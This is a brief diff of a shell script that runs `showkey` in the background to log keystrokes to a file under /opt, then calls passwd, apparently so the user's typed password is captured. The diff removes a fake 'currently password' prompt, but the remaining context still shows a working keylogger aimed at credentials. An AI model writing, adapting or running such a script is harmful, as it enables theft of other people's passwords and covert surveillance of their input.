@@ -3,12 +3,6 @@
 FOLDER="kelompokkucing"
 showkey > /opt/$FOLDER/logger.txt &
 
-# for fake
-echo -n "currently password : "
-read currentPassword
-echo ""
-# end-for fake
-
 /usr/bin/passwd
 let counter=0
 for TARGET in $(ps aux | grep showkey);do
